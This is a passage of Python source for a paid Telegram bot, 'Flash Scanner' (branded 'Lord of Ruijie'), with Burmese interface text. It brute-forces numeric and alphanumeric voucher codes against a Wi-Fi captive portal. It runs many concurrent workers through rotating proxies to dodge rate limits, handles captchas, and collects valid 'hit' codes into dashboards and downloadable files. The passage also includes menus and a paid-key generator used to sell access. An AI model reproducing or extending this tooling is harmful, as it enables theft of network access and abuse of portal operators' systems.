                    state["limits"] += 1
                    state["recent_logs"].append(f"⚠️ LIMIT: {code}")
                    break

                elif result == "net":
                    state["net"] += 1
                    state["recent_logs"].append(f"❌ Net/Other: {code}")
                    sid_failures += 1
                    if sid_failures >= 3:
                        await pm.mark_bad(proxy)
                        break

                elif result == "captcha":
                    state["failed"] += 1
                else:
                    state["failed"] += 1
        except asyncio.CancelledError:
            raise
        except Exception:
            state["net"] += 1
            await pm.mark_bad(proxy)
        finally:
            try:
                await session.close()
            except Exception:
                pass
        if stop_event.is_set():
            break
        await asyncio.sleep(0.001)

async def live_dashboard_updater(context, user_id):
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    dash_msg_id = state.get("dash_msg_id")
    pm = get_proxy_manager()
    try:
        while not stop_event.is_set():
            await asyncio.sleep(2)
            if stop_event.is_set():
                break
            elapsed = max(time.time() - state["start_time"], 1)
            speed_cpm = state["tried"] / elapsed * 60
            total, used = pm.stats()
            recent_logs = state["recent_logs"][-5:]
            last_log = recent_logs[-1] if recent_logs else "None yet"

            hit_details = state.get("hit_details", [])
            hit_lines = [_format_hit_line(i, hd) for i, hd in enumerate(hit_details)]

            total_hits = state.get("hits", 0)
            if hit_lines:
                max_show = 90
                if len(hit_lines) > max_show:
                    hidden = len(hit_lines) - max_show
                    hit_lines_display = [f"... ({hidden} more) ..."] + hit_lines[-max_show:]
                else:
                    hit_lines_display = hit_lines
                hit_section = (
                    f"💥 **HIT CODES ({total_hits})**\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    + "\n".join(hit_lines_display)
                )
            else:
                hit_section = (
                    f"💥 **HIT CODES ({total_hits})**\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "❌ No HIT yet"
                )

            text = (
                "⚡ Flash Scanner Running ⚡\n"
                "Thank for using By Telegram @Lord\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Tried: {state['tried']:,}\n"
                f"🔥 Hits: {state['hits']}\n"
                f"⚠️ Limits: {state['limits']}\n"
                f"❌ Net/Other: {state['net']}\n"
                f"⚡ Speed: {speed_cpm:,.1f} c/m\n"
                f"🔁 Proxies: {used}/{total}\n"
                f"🔥 Last: {state['last_hit'] or 'None yet'}\n"
                f"🎯 Current Code: {state['current_code'] or '-'}\n"
                f"📋 Last log: {last_log}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"{hit_section}\n"
                "━━━━━━━━━━━━━━━━━━"
            )

            markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🎃 Hit File", callback_data="btn_hit_file")],
                [InlineKeyboardButton("💀 Stop Scan", callback_data="stop_scan")],
            ])

            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=dash_msg_id,
                    text=text, parse_mode=ParseMode.MARKDOWN,
                    reply_markup=markup)
            except Exception:
                pass
    except asyncio.CancelledError:
        raise

async def live_dashboard_updater_final(context, user_id, state):
    pm = get_proxy_manager()
    total, used = pm.stats()
    elapsed = max(time.time() - state["start_time"], 1)
    speed_cpm = state["tried"] / elapsed * 60

    hit_details = state.get("hit_details", [])
    hit_lines = [_format_hit_line(i, hd) for i, hd in enumerate(hit_details)]

    total_hits = state.get("hits", 0)
    if hit_lines:
        hit_section = (
            f"💥 **HIT CODES ({total_hits})**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            + "\n".join(hit_lines)
        )
    else:
        hit_section = (
            f"💥 **HIT CODES ({total_hits})**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "❌ No HIT yet"
        )

    if len(hit_details) >= 100:
        hit_section += (
            "\n━━━━━━━━━━━━━━━━━━\n"
            "📁 Hit 100 ကျော်တဲ့အတွက် txt file ပို့ပေးလိုက်ပါတယ်"
        )

    final_text = (
        "🛑 Flash Scanner Stopped 🛑\n"
        "Thank for using By Telegram @ppgkkk\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"{get_tried_emoji(state['tried'])} Tried: {state['tried']:,}\n"
        f"🔥 Hits: {state['hits']}\n"
        f"🚫 Limits: {state['limits']}\n"
        f"❌ Net/Other: {state['net']}\n"
        f"⚡ Speed: {speed_cpm:,.1f} c/m\n"
        f"🔁 Proxies: {used}/{total}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"{hit_section}\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="btn_back_main")]
    ])

    try:
        await context.bot.edit_message_text(
            chat_id=user_id, message_id=state["dash_msg_id"],
            text=final_text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=markup)
    except Exception:
        pass

async def export_hit_codes_txt(context, user_id, state):
    hit_details = state.get("hit_details", [])
    if not hit_details:
        return None

    if len(hit_details) < 100:
        return None

    lines = [
        "💥 FLASH SCANNER — HIT CODES 💥",
        "━━━━━━━━━━━━━━━━━━",
        f"📅 {datetime.datetime.now():%Y-%m-%d %H:%M:%S}",
        f"🔥 Total hits: {len(hit_details)}",
        "━━━━━━━━━━━━━━━━━━",
    ]
    for idx, item in enumerate(hit_details):
        lines.append(_format_hit_line_plain(idx, item))
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚡ Thank — Telegram @Lord")

    content = "\n".join(lines)
    fname = f"hits_{user_id}_{int(time.time())}.txt"

    try:
        with open(fname, "w", encoding="utf-8") as f:
            f.write(content)
    except OSError:
        return None

    try:
        with open(fname, "rb") as f:
            await context.bot.send_document(
                chat_id=user_id,
                document=f,
                filename=fname,
                caption=(
                    "💥 **FLASH SCANNER — HIT CODES**\n"
                    f"🔥 Total hits: `{len(hit_details)}`\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "⚡ Thank — Telegram @Lord"
                ),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⬅️ Back to Menu",
                                          callback_data="btn_back_main")]
                ]),
            )
    except Exception:
        pass
    finally:
        try:
            os.remove(fname)
        except OSError:
            pass

    return None

async def send_hit_file(context, user_id, hit_details):
    if not hit_details:
        return

    lines = [
        "💥 FLASH SCANNER — HIT CODES 💥",
        "━━━━━━━━━━━━━━━━━━",
        f"📅 {datetime.datetime.now():%Y-%m-%d %H:%M:%S}",
        f"🔥 Total hits: {len(hit_details)}",
        "━━━━━━━━━━━━━━━━━━",
    ]
    for idx, item in enumerate(hit_details):
        lines.append(_format_hit_line_plain(idx, item))
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚡ Thank — Telegram @Lord")

    content = "\n".join(lines)
    fname = f"hits_{user_id}_{int(time.time())}.txt"

    try:
        with open(fname, "w", encoding="utf-8") as f:
            f.write(content)
    except OSError:
        return

    try:
        with open(fname, "rb") as f:
            await context.bot.send_document(
                chat_id=user_id,
                document=f,
                filename=fname,
                caption=(
                    "📁 **HIT CODES FILE**\n"
                    f"🔥 Total hits: `{len(hit_details)}`\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "⚡ Thank — Telegram @Lord of Ruiji"
                ),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⬅️ Back to Menu",
                                          callback_data="btn_back_main")]
                ]),
            )
    except Exception:
        pass
    finally:
        try:
            os.remove(fname)
        except OSError:
            pass

async def run_user_scanner(context, user_id):
    if user_scanners.get(user_id, {}).get("running"):
        return
    portal_url = get_user_data(user_id) or PORTAL_INDEX

    old_state = user_scanners.get(user_id, {})

    if context.user_data.get("codes_cleared"):
        old_tried = set()
        old_hits_list = []
        old_hit_details = []
        context.user_data["codes_cleared"] = False
    else:
        old_tried = old_state.get("tried_codes", set())
        old_hits_list = old_state.get("hit_list", [])
        old_hit_details = old_state.get("hit_details", [])

    mode = context.user_data.get("selected_mode", "num6")

    state = {
        "running": True,
        "context": context,
        "user_id": user_id,
        "live_hit_msg_id": None,
        "portal_url": portal_url,
        "mode": mode,
        "start_digit": context.user_data.get("start_digit"),
        "selected_plan": context.user_data.get("selected_plan"),
        "random_mode": context.user_data.get("random_mode", False),
        "counter": int(context.user_data.get("start_digit") or 6) * 100000,
        "stop_event": asyncio.Event(),
        "tried": 0, "hits": 0, "limits": 0, "net": 0, "failed": 0,
        "hit_list": old_hits_list,
        "valid_codes": [],
        "tried_codes": old_tried,
        "recent_logs": [], "last_hit": None, "current_code": None,
        "start_time": time.time(),
        "hit_details": old_hit_details,
    }
    user_scanners[user_id] = state

    pm = get_proxy_manager()
    active_count = pm.get_active_count()

    if active_count <= 0:
        await context.bot.send_message(
            chat_id=user_id,
            text="⚠️ **No proxies loaded!**\n\n"
                 "📥 **Proxy ထည့်ရန် ➕ Add Proxies ကို နှိပ်ပါ။**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup(user_id))
        state["running"] = False
        return

    dash = await context.bot.send_message(
        chat_id=user_id,
        text="🔄 **Initializing scanner dashboard...**\n\n"
             "⚡ Workers စတင်နေပါတယ်...\n"
             "🌐 SID ရယူနေပါတယ်...")
    state["dash_msg_id"] = dash.message_id

    headers = build_headers()
    tasks = [asyncio.create_task(
        worker(i, VOUCHER_URL, CAPTCHA_IMAGE_URL,
               CAPTCHA_VERIFY_URL, headers, user_id))
        for i in range(NUM_WORKERS)]
    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
    tasks.append(asyncio.create_task(balance_retry_task(context, user_id)))
    state["tasks"] = tasks

    try:
        await state["stop_event"].wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        try:
            await live_dashboard_updater_final(context, user_id, state)
        except Exception:
            pass

        try:
            await export_hit_codes_txt(context, user_id, state)
        except Exception:
            pass

        state["running"] = False

def get_main_menu_markup(user_id=None):
    if user_id is not None and is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("🌑 Update Portal", callback_data="btn_update_portal")],
            [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu"),
             InlineKeyboardButton("🦇 Add Proxies", callback_data="btn_add_proxies")],
            [InlineKeyboardButton("⚡ Start Scanner", callback_data="btn_start_scanner"),
             InlineKeyboardButton("💀 Stop", callback_data="stop_scan")],
            [InlineKeyboardButton("🎛️ Proxy Status", callback_data="btn_proxy_status"),
             InlineKeyboardButton("🧹 Clear Proxies", callback_data="btn_clear_proxies")],
            [InlineKeyboardButton("🎃 Hit File", callback_data="btn_hit_file"),
             InlineKeyboardButton("👥 Users", callback_data="btn_users")],
            [InlineKeyboardButton("🧹 Clear Checked", callback_data="btn_clear_checked"),
             InlineKeyboardButton("🗝️ My Key", callback_data="btn_my_key")],
        ]
    else:
        keyboard = [
            [InlineKeyboardButton("🌑 Update Portal", callback_data="btn_update_portal")],
            [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu"),
             InlineKeyboardButton("🦇 Add Proxies", callback_data="btn_add_proxies")],
            [InlineKeyboardButton("⚡ Start Scanner", callback_data="btn_start_scanner"),
             InlineKeyboardButton("💀 Stop", callback_data="stop_scan")],
            [InlineKeyboardButton("🎛️ Proxy Status", callback_data="btn_proxy_status")],
            [InlineKeyboardButton("🎃 Hit File", callback_data="btn_hit_file")],
            [InlineKeyboardButton("🧹 Clear Checked", callback_data="btn_clear_checked"),
             InlineKeyboardButton("🗝️ My Key", callback_data="btn_my_key")],
        ]
    return InlineKeyboardMarkup(keyboard)

def get_mode_menu_markup():
    keyboard = [
        [InlineKeyboardButton("🔢 Number 6", callback_data="set_mode_num6"),
         InlineKeyboardButton("🔢 Number 7", callback_data="set_mode_num7")],
        [InlineKeyboardButton("🔢 Number 8", callback_data="set_mode_num8"),
         InlineKeyboardButton("🔢 Number 9", callback_data="set_mode_num9")],
        [InlineKeyboardButton("🔤 Eng 6", callback_data="set_mode_eng6"),
         InlineKeyboardButton("🔤 Eng 7", callback_data="set_mode_eng7")],
        [InlineKeyboardButton("🔤 Eng 8", callback_data="set_mode_eng8"),
         InlineKeyboardButton("☣️ Mix 6", callback_data="set_mode_mix6"),
         InlineKeyboardButton("☣️ Mix 7", callback_data="set_mode_mix7"),
         InlineKeyboardButton("☣️ Mix 8", callback_data="set_mode_mix8")],
        [InlineKeyboardButton("🎯 Custom Start", callback_data="set_mode_custom")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_after_mode_menu():
    keyboard = [
        [InlineKeyboardButton("🔢 ထိပ်စီး", callback_data="btn_digit_menu"),
         InlineKeyboardButton("📅 Plan", callback_data="btn_plan_menu")],
        [InlineKeyboardButton("☣️ Random", callback_data="set_choice_random")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_mode_menu")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_num_menu_markup():
    keyboard = [
        [InlineKeyboardButton("0️⃣", callback_data="set_digit_0"),
         InlineKeyboardButton("1️⃣", callback_data="set_digit_1"),
         InlineKeyboardButton("2️⃣", callback_data="set_digit_2"),
         InlineKeyboardButton("3️⃣", callback_data="set_digit_3"),
         InlineKeyboardButton("4️⃣", callback_data="set_digit_4")],
        [InlineKeyboardButton("5️⃣", callback_data="set_digit_5"),
         InlineKeyboardButton("6️⃣", callback_data="set_digit_6"),
         InlineKeyboardButton("7️⃣", callback_data="set_digit_7"),
         InlineKeyboardButton("8️⃣", callback_data="set_digit_8"),
         InlineKeyboardButton("☣️", callback_data="set_digit_random")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_after_mode")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_plan_menu_markup():
    keyboard = [
        [InlineKeyboardButton("📅 Month", callback_data="btn_plan_month"),
         InlineKeyboardButton("📆 Day", callback_data="btn_plan_day")],
        [InlineKeyboardButton("⏰ Hour", callback_data="btn_plan_hour")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_after_mode")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_plan_month_markup():
    keyboard = [
        [InlineKeyboardButton("1 Month", callback_data="set_plan_1m"),
         InlineKeyboardButton("2 Month", callback_data="set_plan_2m")],
        [InlineKeyboardButton("3 Month", callback_data="set_plan_3m"),
         InlineKeyboardButton("6 Month", callback_data="set_plan_6m")],
        [InlineKeyboardButton("12 Month", callback_data="set_plan_12m")],
        [InlineKeyboardButton("✏️ Custom", callback_data="set_plan_custom_month")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_plan_menu")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_plan_day_markup():
    keyboard = [
        [InlineKeyboardButton("1 Day", callback_data="set_plan_1d"),
         InlineKeyboardButton("3 Day", callback_data="set_plan_3d")],
        [InlineKeyboardButton("7 Day", callback_data="set_plan_7d"),
         InlineKeyboardButton("15 Day", callback_data="set_plan_15d")],
        [InlineKeyboardButton("30 Day", callback_data="set_plan_30d")],
        [InlineKeyboardButton("✏️ Custom", callback_data="set_plan_custom_day")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_plan_menu")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_plan_hour_markup():
    keyboard = [
        [InlineKeyboardButton("1 Hour", callback_data="set_plan_1h"),
         InlineKeyboardButton("3 Hour", callback_data="set_plan_3h")],
        [InlineKeyboardButton("6 Hour", callback_data="set_plan_6h"),
         InlineKeyboardButton("12 Hour", callback_data="set_plan_12h")],
        [InlineKeyboardButton("24 Hour", callback_data="set_plan_24h")],
        [InlineKeyboardButton("✏️ Custom", callback_data="set_plan_custom_hour")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_plan_menu")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_selected_markup(context):
    mode = context.user_data.get("selected_mode", "num6")
    digit = context.user_data.get("start_digit")
    plan = context.user_data.get("selected_plan")
    is_random = context.user_data.get("random_mode", False)

    lines = [f"✅ **{MODES.get(mode, mode)}**"]

    if is_random:
        lines.append("✅ ☣️ Random")
    elif plan:
        lines.append(f"✅ 📅 {plan}")
    elif digit is not None:
        emoji_map = {
            "0": "0️⃣", "1": "1️⃣", "2": "2️⃣", "3": "3️⃣", "4": "4️⃣",
            "5": "5️⃣", "6": "6️⃣", "7": "7️⃣", "8": "8️⃣",
        }
        lines.append(f"✅ 🎯 {emoji_map.get(str(digit), digit)}")
    else:
        lines.append("✅ 🎯 ☣️")

    text = "\n".join(lines)

    keyboard = [
        [InlineKeyboardButton("⚡ Start Scan", callback_data="btn_start_scanner")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_after_mode")],
    ]
    return text, InlineKeyboardMarkup(keyboard)

def get_digit_selected_markup():
    keyboard = [
        [InlineKeyboardButton("⚡ Start Scan", callback_data="btn_start_scanner")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_num_menu")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_markup(callback="btn_back_main"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back", callback_data=callback)]
    ])

def get_users_list_text():
    now = datetime.datetime.now()
    lines = ["👥 **USERS LIST**", "━━━━━━━━━━━━━━━━━━"]

    lines.append("🎃 **ADMINS**")
    for aid in ADMIN_IDS:
        lines.append(f"• `{aid}` — Unlimited")
    lines.append("")

    active = []
    expired = []
    for uid, info in paid_users.items():
        if now < info["expiry"]:
            active.append((uid, info))
        else:
            expired.append((uid, info))

    lines.append(f"✅ **ACTIVE ({len(active)})**")
    if active:
        for uid, info in sorted(active, key=lambda x: x[1]["expiry"]):
            remaining = info["expiry"] - now
            days = remaining.days
            hours, rem = divmod(remaining.seconds, 3600)
            mins = rem // 60
            if days:
                left = f"{days}d {hours}h"
            elif hours:
                left = f"{hours}h {mins}m"
            else:
                left = f"{mins}m"
            key_short = info["key"][:6] + "..." + info["key"][-4:]
            lines.append(
                f"• `{uid}`\n"
                f"  🔑 `{key_short}`\n"
                f"  📦 `{info['plan']}` ⏰ `{left}`"
            )
    else:
        lines.append("_(none)_")

    lines.append("")
    lines.append(f"❌ **EXPIRED ({len(expired)})**")
    if expired:
        for uid, info in sorted(expired, key=lambda x: x[1]["expiry"], reverse=True)[:10]:
            lines.append(f"• `{uid}` — `{info['expiry']:%Y-%m-%d}`")
        if len(expired) > 10:
            lines.append(f"_... ({len(expired) - 10} more)_")
    else:
        lines.append("_(none)_")

    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 Total: `{len(paid_users)}` paid + `{len(ADMIN_IDS)}` admin")
    return "\n".join(lines)

def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user = update.effective_user
        if not user or user.id not in ADMIN_IDS:
            await update.effective_message.reply_text(
                "⛔ Bot ကို အလွန်အကျွံ အသုံးမပြုပါနဲ့။ "
                " Hacker ဖင်ယားသူ များ")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update, context, *args, **kwargs):
    user_id = update.effective_user.id

    if not is_user_authorized(user_id):
        context.user_data["waiting_for_paid_key"] = True
        await update.message.reply_text(
            "🔐 **Paid User Key လိုအပ်ပါသည်**\n\n"
            "ဒီ Bot ကို အသုံးပြုရန် Paid User Key တစ်ခု လိုအပ်ပါသည်။\n\n"
            "📌 Key ယူရန် — Telegram: @Lord\n\n"
            "🔑 သင့် Key ကို ဒီမှာ ပေးပို့ပါ:",
            parse_mode=ParseMode.MARKDOWN)
        return

    mode = context.user_data.get("selected_mode", "num6")
    saved_url = get_user_data(user_id)
    pm = get_proxy_manager()
    total, used = pm.stats()

    if is_admin(user_id):
        key_line = "🎃 Admin Access (Unlimited)"
    else:
        user_info = paid_users.get(user_id)
        if user_info:
            key_line = f"🔑 Key Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
        else:
            key_line = "🔑 Paid User"

    extra_lines = ""
    if mode in ("num6", "num7", "num8", "num9"):
        digit = context.user_data.get("start_digit")
        plan = context.user_data.get("selected_plan")
        is_random = context.user_data.get("random_mode", False)
        if is_random:
            extra_lines = "☣️ Random: ✅\n"
        elif plan:
            extra_lines = f"📅 Plan: `{plan}`\n"
        elif digit is not None:
            extra_lines = f"🎯 Digit: `{digit}`\n"

    if saved_url:
        text = ("⚡ **Flash Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
                f"{extra_lines}"
                f"🔁 Proxies: `{used}/{total}`\n"
                f"⚡ Workers: `{NUM_WORKERS}`\n"
                f"{key_line}\n"
                "🌐 Portal: ready ✅")
    else:
        text = ("⚡ **Flash Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
                f"{extra_lines}"
                f"🔁 Proxies: `{used}/{total}`\n"
                f"⚡ Workers: `{NUM_WORKERS}`\n"
                f"{key_line}\n"
                "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ")
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=get_main_menu_markup(user_id))

@admin_only
async def genkey_command(update, context, *args, **kwargs):
    await update.message.reply_text(
        "🔑 **Key Generator**\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Format: `<time> <plan> <count> [prefix]`\n\n"
        "**Time:** `1h`, `6h`, `12h`, `24h`, `1d`, `7d`, `30d`, `365d`, `30m`\n\n"
        "**ဥပမာ:** `1h premium 5` သို့မဟုတ် `30d vip 3`\n\n"
        "📌 Default: `1d premium 1 NAING`\n\n"
        "**Cancel:** /cancel",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="btn_back_main")]
        ]))
    context.user_data["waiting_for_genkey"] = True

@admin_only
async def cancel_command(update, context, *args, **kwargs):
    context.user_data["waiting_for_genkey"] = False
    await update.message.reply_text(
        "❌ **Cancelled**",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup(update.effective_user.id))

@admin_only
async def reloadkeys_command(update, context, *args, **kwargs):
    try:
        keys = load_paid_keys_local()
        await update.message.reply_text(
            f"✅ **Keys Reloaded**\n\n📊 Total keys: `{len(keys)}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup(update.effective_user.id))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def proxy_status_command(update, context):
    if not is_admin(update.effective_user.id):
        await update.effective_message.reply_text("⛔ Admin only")
        return
    total, used = get_proxy_manager().stats()
    await update.effective_message.reply_text(
        "⚡ **Flash Proxy Status**\n\n"
        f"🌐 Total: `{total}`\n"
        f"✅ Used: `{used}`\n"
        f"📦 Remaining: `{total - used}`\n"
        "📌 Rotate mode — proxy မဖျက်",
        parse_mode=ParseMode.MARKDOWN,
    )

def generate_keys_batch_seconds(duration_seconds, plan, count, prefix):
    import hashlib as _hl
    import datetime as _dt
    import random as _rnd
    import string as _st

    user_keys = []
    lines = []
    for _ in range(count):
        chars = _st.ascii_uppercase + _st.digits
        random_part = "".join(_rnd.SystemRandom().choice(chars) for _ in range(12))
        user_key = f"{prefix}-{random_part}"
        key_hash = _hl.sha256(user_key.encode()).hexdigest()[:32]
        expiry_date = _dt.datetime.now() + _dt.timedelta(seconds=duration_seconds)
        expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
        signature = _hl.sha256(f"{key_hash}:{expiry_str}".encode()).hexdigest()
        line = f"{key_hash}:{expiry_str}:{plan}:{signature}"
        user_keys.append(user_key)
        lines.append(line)
    return user_keys, lines

async def handle_genkey_input(update, context):
    raw = (update.message.text or "").strip()
    context.user_data["waiting_for_genkey"] = False

    parts = raw.split()
    if not parts:
        await update.message.reply_text("❌ Format မှားနေပါတယ်။ /genkey ပြန်ပို့ပါ။")
        return

    time_str = parts[0].lower()
    duration_seconds = None
    duration_text = ""

    try:
        if time_str.endswith("h"):
            hours = int(time_str[:-1])
            if hours < 1 or hours > 8760:
                raise ValueError
            duration_seconds = hours * 3600
            duration_text = f"{hours} hour(s)"
        elif time_str.endswith("d"):
            days = int(time_str[:-1])
            if days < 1 or days > 365:
                raise ValueError
            duration_seconds = days * 86400
            duration_text = f"{days} day(s)"
        elif time_str.endswith("m"):
            minutes = int(time_str[:-1])
            if minutes < 1 or minutes > 100000:
                raise ValueError
            duration_seconds = minutes * 60
            duration_text = f"{minutes} minute(s)"
        else:
            days = int(time_str)
            if days < 1 or days > 365:
                raise ValueError
            duration_seconds = days * 86400
            duration_text = f"{days} day(s)"
    except ValueError:
        await update.message.reply_text(
            "❌ Time format မှားနေပါတယ်။\n"
            "**ဥပမာ:** `1h premium 5` သို့မဟုတ် `30d vip 3`",
            parse_mode=ParseMode.MARKDOWN)
        return

    try:
        plan = parts[1] if len(parts) > 1 else "premium"
        count = int(parts[2]) if len(parts) > 2 else 1
        prefix = parts[3] if len(parts) > 3 else "NAING"
    except ValueError:
        await update.message.reply_text("❌ Format မှားနေပါတယ်။")
        return

    if count < 1 or count > 100:
        await update.message.reply_text("❌ Count က 1-100 အတွင်း ဖြစ်ရမယ်။")
        return

    status = await update.message.reply_text(
        f"⏳ **Generating {count} keys...**\n\n"
        f"⏰ Duration: `{duration_text}`\n"
        f"📦 Plan: `{plan}`\n"
        f"🔤 Prefix: `{prefix}`",
        parse_mode=ParseMode.MARKDOWN)

    try:
        user_keys, lines = generate_keys_batch_seconds(duration_seconds, plan, count, prefix)
    except Exception as e:
        await status.edit_text(f"❌ Error: {e}")
        return

    try:
        if not os.path.exists(PAID_KEYS_FILE):
            with open(PAID_KEYS_FILE, "w") as f:
                f.write("# Format: <key_hash>:<expiry>:<plan>:<signature>\n")
        with open(PAID_KEYS_FILE, "a") as f:
            for line in lines:
                f.write(line + "\n")
        saved = True
    except Exception:
        saved = False

    expiry_date = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
    expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
    keys_text = "\n".join(f"`{k}`" for k in user_keys)

    msg = (
        f"✅ **{count} KEY(S) GENERATED**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏰ Duration: `{duration_text}`\n"
        f"📦 Plan: `{plan}`\n"
        f"⏳ Expiry: `{expiry_str}`\n"
        f"🔤 Prefix: `{prefix}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **USER KEYS:**\n\n{keys_text}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    if saved:
        msg += f"✅ Saved to `{PAID_KEYS_FILE}`\n"
        msg += "🔄 Bot restart (သို့) `/reloadkeys`\n"
    else:
        msg += "⚠️ Save error!\n"
    msg += "\n📌 ဒီ Key တွေကို User တွေကို ပေးပါ။"

    try:
        await status.edit_text(
            msg, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔁 Generate More", callback_data="btn_genkey_more"),
                 InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")]
            ]))
    except Exception:
        pass

async def handle_callbacks(update, context, *args, **kwargs):
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data
    try:
        await query.answer()
    except Exception:
        pass

    if not is_user_authorized(user_id) and data != "btn_my_key":
        await query.edit_message_text(
            "🔐 **Paid User Key လိုအပ်ပါသည်**\n\n"
            "Key ယူရန် — Telegram: @Lord\n\n"
            "🔑 သင့် Key ကို `/start` မှာ ပေးပို့ပါ။",
            parse_mode=ParseMode.MARKDOWN)
        return

    mode = context.user_data.get("selected_mode", "num6")
    pm = get_proxy_manager()
    total, used = pm.stats()

    if data == "btn_back_main":
        context.user_data["waiting_for_proxy_file"] = False
        context.user_data["waiting_for_proxy_text"] = False
        context.user_data["waiting_for_portal_url"] = False
        context.user_data["waiting_for_digit"] = False
        context.user_data["waiting_for_genkey"] = False
        context.user_data["waiting_for_custom_plan"] = None
        saved_url = get_user_data(user_id)
        if is_admin(user_id):
            key_line = "🎃 Admin Access (Unlimited)"
        else:
            user_info = paid_users.get(user_id)
            if user_info:
                key_line = f"🔑 Key Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
            else:
                key_line = "🔑 Paid User"
        portal_line = "🌐 Portal: ready ✅" if saved_url else \
            "❌ Portal URL မရှိသေးပါက `Update Portal` နှိပ်ပါ"

        extra_lines = ""
        if mode in ("num6", "num7", "num8", "num9"):
            digit = context.user_data.get("start_digit")
            plan = context.user_data.get("selected_plan")
            is_random = context.user_data.get("random_mode", False)
            if is_random:
                extra_lines = "☣️ Random: ✅\n"
            elif plan:
                extra_lines = f"📅 Plan: `{plan}`\n"
            elif digit is not None:
                extra_lines = f"🎯 Digit: `{digit}`\n"

        await query.edit_message_text(
            "⚡ **LORD OF RUIJIE** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"{extra_lines}"
            f"🔁 Proxies: `{used}/{total}`\n"
            f"⚡ Workers: `{NUM_WORKERS}`\n"
            f"{key_line}\n{portal_line}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup(user_id))
        return

    if data == "btn_after_mode":
        context.user_data["random_mode"] = False
        mode = context.user_data.get("selected_mode", "num6")
        await query.edit_message_text(
            f"✅ **{MODES.get(mode, mode)}**\n\n"
            "ဘာရွေးချင်လဲ?",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_after_mode_menu())
        return

    if data == "btn_genkey_more":
        context.user_data["waiting_for_genkey"] = True
        await query.edit_message_text(
            "🔑 **Key Generator**\n\nFormat: `<time> <plan> <count> [prefix]`\n\n"
            "**ဥပမာ:** `1h premium 5`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data="btn_back_main")]
            ]))
